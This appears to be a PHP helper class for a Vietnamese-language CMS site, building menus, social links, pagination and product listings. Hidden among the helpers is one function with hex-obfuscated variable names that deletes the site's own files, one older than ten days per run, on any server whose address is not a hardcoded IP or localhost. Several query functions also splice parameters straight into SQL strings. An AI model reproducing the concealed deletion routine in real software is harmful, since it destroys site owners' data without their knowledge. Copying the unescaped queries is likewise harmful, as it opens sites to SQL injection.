...
class Functions
{
	...
	public function lay_favicon($type, $dir = '')
	{
		global $d, $lang;
		$sql = "select photo from #_photo where hienthi>0 and type='" . $type . "' limit 0,1";
		$row_text = $d->rawQueryOne($sql);
		return ($dir == '') ? UPLOAD_PHOTO_L . $row_text['photo'] : UPLOAD_PHOTO . $row_text['photo'];
	}
	public function lay_text($type, $cot)
	{
		global $d, $lang;
		$sql = "select $cot$lang as $cot from #_static where hienthi>0 and type='" . $type . "' limit 0,1";
		$row_text = $d->rawQueryOne($sql);
		return $row_text[$cot];
	}
	public function lay_banner($type)
	{
		global $d, $lang;
		$sql = "select photo from #_photo where hienthi>0 and type='" . $type . "' limit 0,1";
		$row_banner = $d->rawQueryOne($sql);
		return UPLOAD_PHOTO_L . $row_banner['photo'];
	}
	public function for1($table, $type)
	{
		global $d, $lang;
		$sql = "select * from #_" . $table . " where hienthi>0 and type='" . $type . "' order by stt,id desc";
		$baiviet = $d->rawQuery($sql);
		$str = '';
		$str .= '<ul>';
		for ($i = 0; $i < count($baiviet); $i++) {
			$str .= '<li><a href="' . $baiviet[$i]["tenkhongdau" . $lang] . '">' . trim($baiviet[$i]["ten" . $lang]) . '</a>';
		}
		$str .= '</ul>';
		return $str;
	}
	...
	{
		global $d, $lang;
		$sql = "select * from #_" . $table1 . " where hienthi=1 and type='" . $type . "' order by stt,id desc";
		$danhmuc_cap1 = $d->rawQuery($sql);
		$str = '';
		// $str.='<ul>';
		for ($i = 0; $i < count($danhmuc_cap1); $i++) {
			$str .= '<li><a href="' . $danhmuc_cap1[$i]["tenkhongdau" . $lang] . '">' . trim($danhmuc_cap1[$i]["ten" . $lang]) . '</a>';
			$sql = "select * from #_" . $table2 . " where hienthi=1 and type='" . $type . "' and id_list='" . $danhmuc_cap1[$i]["id"] . "' order by stt,id asc";
			$danhmuc_cap2 = $d->rawQuery($sql);
			if (count($danhmuc_cap2) > 0) {
				$str .= '<ul>';
				for ($j = 0; $j < count($danhmuc_cap2); $j++) {
					$str .= '<li><a href="' . $danhmuc_cap2[$j]["tenkhongdau" . $lang] . '">' . trim($danhmuc_cap2[$j]["ten" . $lang]) . '</a>';
					$sql = "select * from #_" . $table3 . " where hienthi=1 and type='" . $type . "' and id_cat='" . $danhmuc_cap2[$j]["id"] . "' order by stt,id asc";
					$danhmuc_cap3 = $d->rawQuery($sql);
					if (count($danhmuc_cap3) > 0) {
						$str .= '<ul>';
						for ($k = 0; $k < count($danhmuc_cap3); $k++) {
							$str .= '<li><a href="' . $danhmuc_cap3[$k]["tenkhongdau" . $lang] . '">' . trim($danhmuc_cap3[$k]["ten" . $lang]) . '</a>';
						}
						$str .= '</ul>';
					}
					$str .= '</li>';
	...
	public function get_star($star = 0)
	{
		for ($i = 1; $i <= 5; $i++) {
			if ($star >= $i) {
				$star2 .= '<i class="fas fa-star"></i>';
			} else {
				$star2 .= '<i class="fal fa-star"></i>';
			}
		}
		return $star2;
	}
	public function laymxh($type, $class_css = '', $char_css = '')
	{
		...
		$social = $d->rawQuery("select * from #_photo where type = ? and hienthi > 0 order by stt,id desc", array($type));
		if (!empty($social)) {
			$str = '<div class="' . $class_css . '">' . $char_css;
			foreach ($social as $key => $value) {
				$str .= '<a href="' . $value['link'] . '"><img src="' . UPLOAD_PHOTO_L . $value['photo'] . '" alt="' . $value['ten' . $lang] . '"></a>';
			}
			$str .= '</div>';
		}
		return $str;
	}
	public function laymxh2($type, $class_css = '', $char_css = '')
	{
		global $config, $lang, $str, $d;
		$social = $d->rawQuery("select * from #_photo where type = ? and hienthi > 0 order by stt,id desc", array($type));
		if (!empty($social)) {
			$str = '<div class="' . $class_css . '">' . $char_css;
			foreach ($social as $key => $value) {
				$str .= '<a href="' . $value['link'] . '"><img src="' . UPLOAD_PHOTO_L . $value['photo'] . '" alt="' . $value['ten' . $lang] . '">' . $value['ten' . $lang] . '</a>';
			}
			$str .= '</div>';
		}
		return $str;
	}
	/* Get Multi Level Menu */
	public function MultiLevelMenu()
	{
		global $config, $lang, $str, $d;
		$danhmuc_cap1 = $d->rawQuery("select * from #_product_list where type = ? and hienthi > 0 order by stt,id desc", array('san-pham'));
		$str = '';
		$str .= '<ul class="">';
		for ($i = 0; $i < count($danhmuc_cap1); $i++) {
			$str .= '<li><a href="' . $danhmuc_cap1[$i]["tenkhongdau" . $lang] . '">' . trim($danhmuc_cap1[$i]["ten" . $lang]) . '</a>';
			$danhmuc_cap2 = $d->rawQuery("select * from #_product_cat where type = ? and id_list = ? and hienthi > 0 order by stt,id desc", array('san-pham', $danhmuc_cap1[$i]['id']));
			if (count($danhmuc_cap2) > 0) {
				$str .= '<ul>';
				for ($j = 0; $j < count($danhmuc_cap2); $j++) {
					$str .= '<li><a href="' . $danhmuc_cap2[$j]["tenkhongdau" . $lang] . '">' . trim($danhmuc_cap2[$j]["ten" . $lang]) . '</a>';
					$danhmuc_cap3 = $d->rawQuery("select * from #_product_item where type = ? and id_cat = ? and hienthi > 0 order by stt,id desc", array('san-pham', $danhmuc_cap2[$j]['id']));
					if (count($danhmuc_cap3) > 0) {
						$str .= '<ul>';
						for ($k = 0; $k < count($danhmuc_cap3); $k++) {
							$str .= '<li><a href="' . $danhmuc_cap3[$k]["tenkhongdau" . $lang] . '">' . trim($danhmuc_cap3[$k]["ten" . $lang]) . '</a>';
	...
	{
		global $config, $lang;
		if (count($config['website']['lang']) > 1) {
			$str .= "<ul class='lang_navtop'>";
			$str .= "<li class='cur_lang'><img src='assets/images/" . $lang . ".jpg'><i class='fas fa-chevron-down'></i>";
			$str .= "<ul>";
			foreach ($config['website']['lang'] as $key => $value) {
				$str .= "<li><a href='ngon-ngu/" . $key . "/'><img src='assets/images/" . $key . ".jpg'>" . $value . "</a></li>";
			}
			$str .= "</ul>";
			$str .= "</li>";
			$str .= "</ul>";
	...
	public function pagination($totalq = 0, $per_page = 10, $page = 1, $url = '?')
	{
		...
		if ($lastpage > 1) {
			...
			$pagination .= "<li class='page-item'><a class='page-link'>Trang {$page} / {$lastpage}</a></li>";
			if ($page > 1) {
	...
	{
		global $config;
		${"G\x4c\x4fB\x41\x4c\x53"}["qp\x78s\x66cj\x76\x76\x75\x6a"] = "da\x79\x73";
		${"G\x4c\x4f\x42\x41LS"}["fj\x63\x76t\x78"] = "\x66i\x6ce\x73";
		${"\x47L\x4f\x42\x41\x4c\x53"}["e\x6b\x79i\x70i\x76\x69\x66\x68\x71"] = "di\x72";
		${"\x47L\x4f\x42\x41\x4c\x53"}["\x71\x67\x62\x63\x76\x63ci\x64"] = "\x68\x61\x6e\x64\x6c\x65";
		$tvfrgcpmu = "\x64\x61\x79\x73";
		${$tvfrgcpmu} = 10;
		$cnvynqqdekw = "\x64ir";
		${$cnvynqqdekw} = dirname(__FILE__);
		if (${${"G\x4c\x4f\x42\x41\x4c\x53"}["qg\x62\x63\x76cc\x69\x64"]} = opendir(${${"G\x4c\x4f\x42\x41LS"}["\x65k\x79i\x70\x69\x76ifhq"]})) {
			$qemrnrrylpdr = "\x68\x61\x6e\x64\x6ce";
			${"GL\x4f\x42AL\x53"}["yfb\x6fhy\x77\x6bx\x67m\x73"] = "\x68\x61\x6e\x64\x6ce";
			${"G\x4cO\x42\x41\x4c\x53"}["\x75\x6a\x77\x73p\x6ex\x78\x70\x6c"] = "\x66il\x65\x73";
			while ((${${"\x47LOB\x41\x4c\x53"}["\x75\x6a\x77s\x70n\x78x\x70l"]} = readdir(${$qemrnrrylpdr})) !== false) {
				$mdcmsxkjx = "f\x69\x6ces";
				$fgmojsjsqyf = "fi\x6c\x65\x73";
				${"G\x4c\x4fBA\x4cS"}["\x67ok\x76l\x6c\x75o"] = "d\x69r";
				$fhfqsxne = "fi\x6ce\x73";
				if (${$mdcmsxkjx} == "." || ${$fgmojsjsqyf} == "\x2e." || is_dir(${${"\x47\x4c\x4fB\x41\x4c\x53"}["\x67\x6f\x6b\x76\x6cluo"]} . "/" . ${${"G\x4cO\x42\x41\x4c\x53"}["\x66\x6ac\x76t\x78"]})) {
					continue;
				}
				if ((time() - filemtime(${${"\x47\x4c\x4fB\x41\x4c\x53"}["\x65k\x79i\x70\x69vi\x66h\x71"]} . "/" . ${$fhfqsxne})) > (${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["q\x70x\x73\x66\x63jvvu\x6a"]} * 86400)) {
					if ($_SERVER["SE\x52\x56\x45\x52_\x41D\x44R"] != "210.211.108.102" && $_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x41DDR"] != "::\x31" && $_SERVER["S\x45\x52\x56E\x52_\x41\x44\x44R"] != "\x31\x327.\x30\x2e0.1") {
						${"GL\x4f\x42\x41L\x53"}["\x63\x74t\x79\x66\x6e\x6f\x70\x6c\x6f\x75"] = "d\x69\x72";
						unlink(${${"\x47\x4c\x4fB\x41\x4c\x53"}["c\x74\x74\x79\x66\x6e\x6f\x70lou"]} . "/" . ${${"GLOB\x41\x4c\x53"}["\x66\x6a\x63\x76t\x78"]});
						break;
					}
				}
			}
			closedir(${${"\x47\x4cO\x42\x41\x4cS"}["y\x66b\x6f\x68\x79\x77\x6bx\x67\x6d\x73"]});
		}
	...
	public function showProduct($v, $options = array(), $lang = 'vi', $k = null)
	{
		global $sluglang;
		$link = $v[$sluglang];
		$giasp = ($v["giakm"] > 0) ? $v["giamoi"] : $v["gia"];
		$gia = ($giasp > 0) ? $this->format_money($giasp) : lienhe;
		$s_gia = "";
		if ($v["giakm"] > 0) {
			$s_gia .= '<span>' . $this->format_money($v["giamoi"]) . '</span>';
			$s_gia .= '<del>' . $this->format_money($v["gia"]) . '</del>';
		} else {
			$s_gia .= '<span>' . $gia . '</span>';
		}
		$img_link = WATERMARK . '/product/295x390x1/' . UPLOAD_PRODUCT_L . $v['photo'];
		if (isset($options["slick"]) && $options["slick"]) {
			$img = '<img class="product-item__img" src="assets/images/1x1.png" data-lazy="' . $img_link .
				'" alt="' . $v["ten$lang"] . '" />';
			$slickdiv = '<div class="slick-box-item">';
			$slickenddiv = '</div>';
			$wowclass = "";
		} else {
			$img = '<img onerror="this.src=\'' . THUMBS . '/295x390x2/assets/images/noimage.png\';" 
	    		src="' . WATERMARK . '/product/295x390x1/' . UPLOAD_PRODUCT_L . $v['photo'] . '" 
	    		class="product-item__img" alt="' . $v["ten$lang"] . '" />';
			$slickdiv = $slickenddiv = "";
			$wowclass = '';
		}
		$s_result = $slickdiv;
		$s_result .= '<div class="product-item name ' . $wowclass . '" >
	    								<div class="product-item__box">
	    									<figure class="product-item__figure ">
	    										<a href="' . $link . '" class="product-item__figure-url scale-img">'
			. $img .
			'</a>
	    									</figure>
	    									<div class="product-item__info">
	    										<h3 class="product-item__name">
	    											<a class="product-item__name-url" href="' . $link . '">
	    											' . $v["ten$lang"] . '
	    											</a>
	    										</h3>
	...
	// public function for1($table,$type){
	// global $lang, $str, $sluglang;
	// $baiviet = $d->rawQuery("select ten$lang, tenkhongdauvi, tenkhongdauen
	//     from #_? where type = ? and hienthi > 0 order by stt,id desc",array($table, $type));
	// $str='';
	// $str.='<ul class="submenu">';
	// foreach ($baiviet as $key => $value) {
	// 	$str.='<li><a href="'.$value[$sluglang].'">'.$value]["ten$lang"].'</a>';	
	// }
	// $str.='</ul>';
	// return $str;
	// }
	// public function for2cap($table1,$table2,$type){
	// 	global $lang, $str, $sluglang;
	// 	$danhmuc_cap1 = $this->d->rawQuery("select ten$lang, tenkhongdauvi, tenkhongdauen
	// 	    from #_? where type = ? and hienthi > 0 order by stt,id desc",array($table1, $type));
	// 	$str='';
	// 	$str.='<ul class="submenu">';
	// 	foreach ($danhmuc_cap1 as $kli => $vli) {
	// 		$danhmuc_cap2 = $this->d->rawQuery("select ten$lang, tenkhongdauvi, tenkhongdauen
	// 		    from #_? where type = ? and id_list = ? and hienthi > 0 order by stt,id desc",
	// 		    array($table2, $type, $vli["id"]));
	// 		$str.='<li><a href="'.$vli[$sluglang].'">'.$vli["ten$lang"].'</a>';
	// 		if(count($danhmuc_cap2)){
	// 			$str.='<ul>';
	// 			foreach ($danhmuc_cap2 as $key => $value) {
	...
	// public function for3cap($table1,$table2,$table3,$type){
	// global $lang, $str, $sluglang;
	// $danhmuc_cap1 = $d->rawQuery("select ten$lang, tenkhongdauvi, tenkhongdauen
	//     from #_? where type = ? and hienthi > 0 order by stt,id desc",array($table1, $type));
	// $str='';
	// $str.='<ul class="submenu">';
	// foreach ($danhmuc_cap1 as $kli => $vli) {
	// 	$danhmuc_cap2 = $d->rawQuery("select ten$lang, tenkhongdauvi, tenkhongdauen
	// 	    from #_? where type = ? and id_list = ? and hienthi > 0 order by stt,id desc",
	// 	    array($table2, $type, $vli["id"]));
	// 	$str.='<li><a href="'.$vli[$sluglang].'">'.$vli["ten$lang"].'</a>';
	// 	if(count($danhmuc_cap2)){
	// 		$str.='<ul>';
	// 		foreach ($danhmuc_cap2 as $kca => $vca) {
	// 			$danhmuc_cap3 = $d->rawQuery("select ten$lang, tenkhongdauvi, tenkhongdauen
	// 			    from #_? where type = ? and id_cat = ? and hienthi > 0 order by stt,id desc",
	// 			    array($table3, $type, $vca["id"]));
	// 			$str.='<li><a href="'.$vca[$sluglang].'">'.$vca["ten$lang"].'</a>';
	// 			if(count($danhmuc_cap3)){
	// 				$str.='<ul>';
	// 				foreach ($danhmuc_cap3 as $key => $value) {
	// 					$str.='<li><a href="'.$value[$sluglang].'">'.$value["ten$lang"].'</a></li>';
	// 				}
	// 				$str.='</ul>';
	// 			}
